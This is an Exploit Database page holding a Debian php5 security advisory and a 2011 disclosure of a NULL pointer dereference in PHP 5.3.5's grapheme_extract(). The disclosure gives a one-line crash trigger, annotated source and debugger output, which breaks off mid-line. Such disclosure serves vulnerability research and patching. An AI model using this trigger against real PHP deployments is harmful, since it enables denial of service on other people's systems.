Package        : php5
Vulnerability  : several
Problem type   : remote
Debian-specific: no
CVE ID         : CVE-2010-2531 CVE-2011-0420 CVE-2011-0421 CVE-2011-0708
                 CVE-2011-1153 CVE-2011-1466 CVE-2011-1471 CVE-2011-2202

Several vulnerabilities were discovered in PHP, which could lead to
denial of service or potentially the execution of arbitrary code.

CVE-2010-2531

   An information leak was found in the var_export() function.

CVE-2011-0421

   The Zip module could crash.

CVE-2011-0708

   An integer overflow was discovered in the Exif module.

CVE-2011-1466

   An integer overflow was discovered in the Calendar module.

CVE-2011-1471

   The Zip module was prone to denial of service through malformed
   archives.

CVE-2011-2202

   Path names in form based file uploads (RFC 1867) were incorrectly
   validated.

This update also fixes two bugs, which are not treated as security
issues, but fixed nonetheless, see README.Debian.security for details
on the scope of security support for PHP (CVE-2011-0420, CVE-2011-1153).

For the oldstable distribution (lenny), this problem has been fixed in
version 5.2.6.dfsg.1-1+lenny12.

For the stable distribution (squeeze), this problem has been fixed in
version 5.3.3-7+squeeze3.

For the unstable distribution (sid), this problem has been fixed in
version 5.3.6-12.

We recommend that you upgrade your php5 packages.

[ PHP 5.3.5 grapheme_extract() NULL Pointer Dereference ]

Author: Maksymilian Arciemowicz
http://securityreason.com/
http://cxib.net/
Date:
- - Dis.: 09.12.2010
- - Pub.: 17.02.2011

CVE: CVE-2011-0420
CERT: VU#210829

Affected Software:
- - PHP 5.3.5

Fixed: SVN

Original URL:
http://securityreason.com/achievement_securityalert/94

- --- 0.Description ---
Internationalization extension (further is referred as Intl) is a wrapper
for ICU library, enabling PHP programmers to perform UCA-conformant
collation and date/time/number/currency formatting in their scripts.

grapheme_extract — Function to extract a sequence of default grapheme
clusters from a text buffer, which must be encoded in UTF-8.

- --- 1. PoC for grapheme_extract() ---
grapheme_extract('a',-1);

Change length of first parameter to change rip.

- --- 2. grapheme_extract() NULL Pointer Dereference ---
As we can see in grapheme_extract(str,size)

- -grapheme_extract()--
...
if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "sl|llz", (char
**)&str, &str_len, &size, &extract_type, &lstart, &next) == FAILURE) {
<=== str='a' and size='-1'
...
/* if the string is all ASCII up to size+1 - or str_len whichever is first
- then we are done.
(size + 1 because the size-th character might be the beginning of a
grapheme cluster)
*/

if ( -1 != grapheme_ascii_check(pstr, size + 1 < str_len ? size + 1 :
str_len ) ) { <=== ( size=-1+1=0 ) ===
long nsize = ( size < str_len ? size : str_len ); <=== nsize = -1
if ( NULL != next ) {
ZVAL_LONG(next, start+nsize);
}
RETURN_STRINGL(((char *)pstr), nsize, 1); <=== CRASH POINT
}
...
- -grapheme_extract()--

if we call to grapheme_ascii_check(pstr,0) where

- -grapheme_ascii_check()--
/* {{{ grapheme_ascii_check: ASCII check */
int grapheme_ascii_check(const unsigned char *day, int32_t len) <====
len=0
{
int ret_len = len;
while ( len-- ) {
if ( *day++ > 0x7f )
return -1;
}

return ret_len; <=== return 0
}
- -grapheme_ascii_check()--

then we get (int)0 in result and

long nsize = ( size < str_len ? size : str_len );

will be -1. Therefore,

RETURN_STRINGL(((char *)pstr), nsize, 1);

give NULL pointer dereference here.

Changing length of first parameter of grapheme_extract(), we will also
change rip in memcpy(3).

(gdb) r -r 'grapheme_extract('a',-1);'
...
(gdb) x/i $rip
=> 0x7ffff5511d99 <memcpy+777>: mov %rax,(%rdi)
(gdb) x/x $rax
0xf9891857a6e70f70: Cannot access memory at address 0xf9891857a6e70f70
(gdb) x/x $rdi
0x11b2000: Cannot access memory at address 0x11b2000
(gdb) r -r
'grapheme_extract('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
,-1);'
...
(gdb) x/i $rip
=> 0x7ffff5511d77 <memcpy+743>: mov 0x18(%rsi),%r10
(gdb) x/x $rsi

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
